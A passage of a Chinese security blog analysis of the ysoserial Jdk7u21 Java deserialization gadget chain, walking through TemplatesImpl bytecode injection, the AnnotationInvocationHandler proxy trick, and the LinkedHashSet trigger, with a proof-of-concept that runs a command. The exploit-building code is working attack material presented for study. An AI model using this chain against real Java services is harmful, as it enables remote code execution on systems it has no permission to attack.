            <span class="n">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">TRANSLET_CLASS_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span>
        <span class="k">catch</span> <span class="o">(</span><span class="n">LinkageError</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">TRANSLET_OBJECT_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span>
    <span class="o">}</span>
</pre></div>
<p><code>_class[i] = loader.defineClass(_bytecodes[i]);</code> ,加载类并不会触发静态方法,但是之后会有一个</p>
<div class="highlight"><pre><span></span><span class="n">AbstractTranslet</span> <span class="n">translet</span> <span class="o">=</span> <span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">)</span> <span class="n">_class</span><span class="o">[</span><span class="n">_transletIndex</span><span class="o">].</span><span class="na">newInstance</span><span class="o">();</span>
</pre></div>
<p>进行实例化，从而触发我们javassist注入的静态恶意代码。</p>
<p><strong>再次梳理代码流程</strong></p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">T</span> <span class="nf">createTemplatesImpl</span> <span class="o">(</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">command</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">tplClass</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">abstTranslet</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">transFactory</span> <span class="o">)</span>
            <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
            <span class="c1">// 建立一个templates 对象</span>
        <span class="kd">final</span> <span class="n">T</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">tplClass</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
        <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">StubTransletPayload</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
        <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">abstTranslet</span><span class="o">));</span>
        <span class="kd">final</span> <span class="n">CtClass</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">StubTransletPayload</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"java.lang.Runtime.getRuntime().exec(\""</span> <span class="o">+</span>
            <span class="n">command</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"\\\\"</span><span class="o">,</span><span class="s">"\\\\\\\\"</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"\""</span><span class="o">,</span> <span class="s">"\\\""</span><span class="o">)</span> <span class="o">+</span>
            <span class="s">"\");"</span><span class="o">;</span>
        <span class="n">clazz</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">insertAfter</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
        <span class="n">clazz</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">"ysoserial.Pwner"</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">nanoTime</span><span class="o">());</span>
        <span class="n">CtClass</span> <span class="n">superC</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">abstTranslet</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
        <span class="n">clazz</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">superC</span><span class="o">);</span>

        <span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
    <span class="o">}</span>
</pre></div>
<p>这里的核心就是将cmd命令通过<code>makeClassInitializer</code>方法注入到了<code>StubTransletPayload</code></p>
<p>但是这个类还有一个要求必须是<code>abstTranslet</code>的子类,所以这里处理两个类</p>
<div class="highlight"><pre><span></span><span class="n">CtClass</span> <span class="n">superC</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">abstTranslet</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
<span class="n">clazz</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">superC</span><span class="o">);</span>
</pre></div>
<p>通过javassistd方式将<code>StubTransletPayload</code>的父类设置为<code>abstTranslet</code></p>
<p>其实ysoserial做了很多重复的工作(可能有其他作用? 迷。)</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164235-7506317a-ccc0-1.png"/></p>
<p>从上面我们简单归纳下执行的顺序:</p>
<div class="highlight"><pre><span></span><span class="mf">1.</span><span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">getOutputProperties</span><span class="o">()</span>
<span class="mf">2.</span><span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">()</span>
<span class="mf">3.</span><span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">getTransletInstance</span><span class="o">()</span>
<span class="mf">4.</span><span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">defineTransletClasses</span><span class="o">()</span>
<span class="mf">5.</span><span class="n">ClassLoader</span><span class="o">.</span><span class="na">defineClass</span><span class="o">()</span>
<span class="mf">6.</span><span class="n">Class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">()</span>
</pre></div>
<p>1,2,3,4中都是可以触发的点，但是1,2 是<code>public</code>方法可以被对象直接调用，而3,4是<code>private</code>方法，只能被对象可调用方法间接调用。</p>
<p>所以我们第二层的目标就是触发第一点或者第二点。</p>
<h3 data-content="1" id="4928d3156b21b6e047bf4ab62f37c455">0x4.2 第二层 AnnotationInvocationHandler</h3>
<div class="highlight"><pre><span></span><span class="n">InvocationHandler</span> <span class="n">tempHandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFirstCtor</span><span class="o">(</span><span class="n">Gadgets</span><span class="o">.</span><span class="na">ANN_INV_HANDLER_CLASS</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
<span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">tempHandler</span><span class="o">,</span> <span class="s">"type"</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">Templates</span> <span class="n">proxy</span> <span class="o">=</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createProxy</span><span class="o">(</span><span class="n">tempHandler</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</pre></div>
<p>第二层的核心是怎么触发第一层的<code>TemplatesImpl.newTransformer()</code></p>
<p>这里选择<code>newTransformer()</code>方法来触发的原因还是比较取巧和骚气的。</p>
<p>理解这个之前，我们先学习一下java的动态代理机制。</p>
<blockquote>
<p>java静态代理: 通过聚合来实现，代理类通过引入被代理类对象。 缺点:不方便批量对接口进行修改</p>
<p>java动态代理:</p>
<p>实现这两个动态代理，有两个重要的接(InvocationHandler)口和类(Proxy)</p>
<p>这个特点经常用在日志记录上面，举一个例子介绍用法:</p>
<p>AppService.java</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">proxypractice</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">AppService</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">createApp</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>AppServiceImpl.java</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">proxypractice</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">AppServiceImpl</span> <span class="kd">implements</span> <span class="n">AppService</span> <span class="o">{</span>

  <span class="nd">@Override</span>
  <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">createApp</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// TODO Auto-generated method stub</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"APP["</span><span class="o">+</span><span class="n">name</span> <span class="o">+</span> <span class="s">"] has beend created!"</span><span class="o">);</span>
      <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
  <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<p>LoggerInterceptor.java</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">proxypractice</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LoggerInterceptor</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span> <span class="o">{</span>
  
  <span class="kd">private</span> <span class="n">Object</span> <span class="n">target</span><span class="o">;</span>
  <span class="kd">public</span> <span class="nf">LoggerInterceptor</span><span class="o">(</span><span class="n">Object</span> <span class="n">t</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// TODO Auto-generated constructor stub</span>
      <span class="k">this</span><span class="o">.</span><span class="na">target</span> <span class="o">=</span> <span class="n">t</span><span class="o">;</span>
  <span class="o">}</span>
  <span class="nd">@Override</span>
  <span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
      <span class="c1">// TODO Auto-generated method stub</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Entered"</span> <span class="o">+</span> <span class="n">target</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Method:"</span> <span class="o">+</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Arguments:"</span> <span class="o">+</span> <span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">);</span>
      <span class="c1">// call target's method</span>
      <span class="n">Object</span> <span class="n">result</span> <span class="o">=</span> <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
      <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
  <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164254-803b7f28-ccc0-1.png"/></p>
<p>LoggerInterceptor 作为一个中介类，继承了InvocationHandler,</p>
<p>Proxy.newProxyInstance 则通过传入被代理类、代理接口、LoggerInterceptor对象生成了一个代理对象。</p>
<p>能够实现在调用被代理类方法之前，进入中介类的invoke函数方法里面进行执行前后的处理。</p>
</blockquote>
<p>学习完动态代理之后,我们就可以理解上面三句话的作用了。</p>
<div class="highlight"><pre><span></span><span class="n">InvocationHandler</span> <span class="n">tempHandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFirstCtor</span><span class="o">(</span><span class="n">Gadgets</span><span class="o">.</span><span class="na">ANN_INV_HANDLER_CLASS</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
<span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">tempHandler</span><span class="o">,</span> <span class="s">"type"</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">Templates</span> <span class="n">proxy</span> <span class="o">=</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createProxy</span><span class="o">(</span><span class="n">tempHandler</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164310-8998c008-ccc0-1.png"/></p>
<p>首先通过Reflections框架通过调用初始化函数创建一个AnnotationInvocationHandler对象实例。</p>
<p>然后设置了<code>type</code>属性为<code>Templates.class</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164321-9093b958-ccc0-1.png"/></p>
<p>然后创建了一个<code>Templates</code>类型的代理,hook了所有接口。(这里绑定什么类都没关系的，因为我们需要的是<code>equals</code>方法，默认继承Object根类都自带这个方法,下面会说的)</p>
<p>我们重新写一个只涉及两层利用的POC,通过debug的方式去分析。</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">ysoserial.example</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.Gadgets</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.Reflections</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">TwoTest</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">TemplatesImpl</span> <span class="n">calc</span> <span class="o">=</span> <span class="o">(</span><span class="n">TemplatesImpl</span><span class="o">)</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createTemplatesImpl</span><span class="o">(</span><span class="s">"open /System/Applications/Calculator.app"</span><span class="o">);</span><span class="c1">//生成恶意的calc</span>
        <span class="n">HashMap</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>

        <span class="n">InvocationHandler</span> <span class="n">tempHandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFirstCtor</span><span class="o">(</span><span class="n">Gadgets</span><span class="o">.</span><span class="na">ANN_INV_HANDLER_CLASS</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">tempHandler</span><span class="o">,</span> <span class="s">"type"</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">Templates</span> <span class="n">proxy</span> <span class="o">=</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createProxy</span><span class="o">(</span><span class="n">tempHandler</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">proxy</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">calc</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164333-9731af04-ccc0-1.png"/></p>
<p>调用栈如下,开始逐一分析吧。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164342-9cbc0f96-ccc0-1.png"/></p>
<p>这里就是检验<code>equals</code>这个方法是不是被重写了,原生的话是会进入<code>equalsImpl</code>这个函数的。</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="n">Boolean</span> <span class="nf">equalsImpl</span><span class="o">(</span><span class="n">Object</span> <span class="n">var1</span><span class="o">)</span> <span class="o">{</span>
       <span class="c1">// 判断var1是否为AnnotationInvocationHandle,var1是templates，pass</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">var1</span> <span class="o">==</span> <span class="k">this</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
          <span class="c1">// 构造限制点，type属性限制了var1必须为this.type的类实例</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">type</span><span class="o">.</span><span class="na">isInstance</span><span class="o">(</span><span class="n">var1</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="c1">//这里获取了当前成员的方法</span>
            <span class="n">Method</span><span class="o">[]</span> <span class="n">var2</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getMemberMethods</span><span class="o">();</span>
            <span class="kt">int</span> <span class="n">var3</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>

            <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">var4</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var4</span> <span class="o">&lt;</span> <span class="n">var3</span><span class="o">;</span> <span class="o">++</span><span class="n">var4</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">Method</span> <span class="n">var5</span> <span class="o">=</span> <span class="n">var2</span><span class="o">[</span><span class="n">var4</span><span class="o">];</span> <span class="c1">//遍历获取方法</span>
                <span class="n">String</span> <span class="n">var6</span> <span class="o">=</span> <span class="n">var5</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span> <span class="c1">//获取方法名字</span>
                <span class="n">Object</span> <span class="n">var7</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">memberValues</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">var6</span><span class="o">);</span><span class="c1">//获取memberValues中的值</span>
                <span class="n">Object</span> <span class="n">var8</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
                <span class="c1">// Proxy.isProxyClass(var1.getClass()</span>
                <span class="c1">// 判断varl是不是代理类,显然不是，pass</span>
                <span class="n">AnnotationInvocationHandler</span> <span class="n">var9</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">asOneOfUs</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">var9</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">var8</span> <span class="o">=</span> <span class="n">var9</span><span class="o">.</span><span class="na">memberValues</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">var6</span><span class="o">);</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                    <span class="k">try</span> <span class="o">{</span>
                        <span class="c1">// 这里直接进行了方法的调用核心。</span>
                        <span class="c1">// var5是方法名,var1是可控的类</span>
                        <span class="c1">// var1.var5()</span>
                        <span class="n">var8</span> <span class="o">=</span> <span class="n">var5</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InvocationTargetException</span> <span class="n">var11</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">var12</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">throw</span> <span class="k">new</span> <span class="n">AssertionError</span><span class="o">(</span><span class="n">var12</span><span class="o">);</span>
                    <span class="o">}</span>
                <span class="o">}</span>

                <span class="k">if</span> <span class="o">(!</span><span class="n">memberValueEquals</span><span class="o">(</span><span class="n">var7</span><span class="o">,</span> <span class="n">var8</span><span class="o">))</span> <span class="o">{</span>
                    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
                <span class="o">}</span>
            <span class="o">}</span>

            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
</pre></div>
<p>我们的目的是<code>`TemplatesImpl.newTransformer()</code></p>
<p>那么我们var1可以通过<code>proxy(var1)</code>方式去控制,那么var5怎么去控制方法的呢？</p>
<p><code>Method[] var2 = this.getMemberMethods();</code> 可以看到这里获取了成员的方法，我们选择跟进去看看。</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="n">Method</span><span class="o">[]</span> <span class="nf">getMemberMethods</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">memberMethods</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">memberMethods</span> <span class="o">=</span> <span class="o">(</span><span class="n">Method</span><span class="o">[])</span><span class="n">AccessController</span><span class="o">.</span><span class="na">doPrivileged</span><span class="o">(</span><span class="k">new</span> <span class="n">PrivilegedAction</span><span class="o">&lt;</span><span class="n">Method</span><span class="o">[]&gt;()</span> <span class="o">{</span>
                <span class="kd">public</span> <span class="n">Method</span><span class="o">[]</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
                    <span class="n">Method</span><span class="o">[]</span> <span class="n">var1</span> <span class="o">=</span> <span class="n">AnnotationInvocationHandler</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">type</span><span class="o">.</span><span class="na">getDeclaredMethods</span><span class="o">();</span>
                    <span class="n">AccessibleObject</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="n">var1</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
                    <span class="k">return</span> <span class="n">var1</span><span class="o">;</span>
                <span class="o">}</span>
            <span class="o">});</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">memberMethods</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<p>结果发现是通过反射机制从<code>this.type</code>这个类属性去获取的。</p>
<p><code>Reflections.setFieldValue(tempHandler, "type", Templates.class);</code></p>
<p>所以这里我们只要控制type为<code>Templates.class</code>就行了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164355-a4c5dff0-ccc0-1.png"/></p>
<p>里面就有<code>newTransformer</code>方法,且为第一个,如果是第二个、第三个话,前面可能会因为参数不对等原因出现错误，导致程序没能执行到<code>newTransformer</code>方法就中断了。</p>
<h3 data-content="1" id="a920865e7528e773c15fcf479c9b3e4e">0x4.3 第三层 LinkedHashSet</h3>
<p>第三层的核心就是触发<code>proxy.equals(calc);</code></p>
<div class="highlight"><pre><span></span><span class="kd">final</span> <span class="n">Object</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createTemplatesImpl</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>

        <span class="n">String</span> <span class="n">zeroHashCodeStr</span> <span class="o">=</span> <span class="s">"f5a5a608"</span><span class="o">;</span>

        <span class="n">HashMap</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="s">"foo"</span><span class="o">);</span>

        <span class="n">InvocationHandler</span> <span class="n">tempHandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFirstCtor</span><span class="o">(</span><span class="n">Gadgets</span><span class="o">.</span><span class="na">ANN_INV_HANDLER_CLASS</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">tempHandler</span><span class="o">,</span> <span class="s">"type"</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">Templates</span> <span class="n">proxy</span> <span class="o">=</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createProxy</span><span class="o">(</span><span class="n">tempHandler</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>

        <span class="n">LinkedHashSet</span> <span class="n">set</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LinkedHashSet</span><span class="o">();</span> <span class="c1">// maintain order</span>
        <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>
        <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">proxy</span><span class="o">);</span>

        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_auxClasses"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_class"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="n">templates</span><span class="o">);</span> <span class="c1">// swap in real object</span>
</pre></div>
<p>这里我们可以直观梳理出第三层关键作用的代码:</p>
<div class="highlight"><pre><span></span><span class="n">LinkedHashSet</span> <span class="n">set</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LinkedHashSet</span><span class="o">();</span> <span class="c1">// maintain order</span>
        <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>
        <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">proxy</span><span class="o">);</span>
</pre></div>
<p>这是最外层<code>LinkedHashSet</code>,这个对象在反序列化的时候会自动触发<code>readObject</code>方法,从而开始了exp的执行流程</p>
<p>通过查看序列化规则<code>writeObject</code></p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectOutputStream</span> <span class="n">s</span><span class="o">)</span>
        <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
        <span class="c1">// Write out any hidden serialization magic</span>
        <span class="n">s</span><span class="o">.</span><span class="na">defaultWriteObject</span><span class="o">();</span>

        <span class="c1">// Write out HashMap capacity and load factor</span>
        <span class="n">s</span><span class="o">.</span><span class="na">writeInt</span><span class="o">(</span><span class="n">map</span><span class="o">.</span><span class="na">capacity</span><span class="o">());</span>
        <span class="n">s</span><span class="o">.</span><span class="na">writeFloat</span><span class="o">(</span><span class="n">map</span><span class="o">.</span><span class="na">loadFactor</span><span class="o">());</span>

        <span class="c1">// Write out size</span>
        <span class="n">s</span><span class="o">.</span><span class="na">writeInt</span><span class="o">(</span><span class="n">map</span><span class="o">.</span><span class="na">size</span><span class="o">());</span>

        <span class="c1">// Write out all elements in the proper order.</span>
        <span class="k">for</span> <span class="o">(</span><span class="n">E</span> <span class="n">e</span> <span class="o">:</span> <span class="n">map</span><span class="o">.</span><span class="na">keySet</span><span class="o">())</span>
            <span class="n">s</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
    <span class="o">}</span>
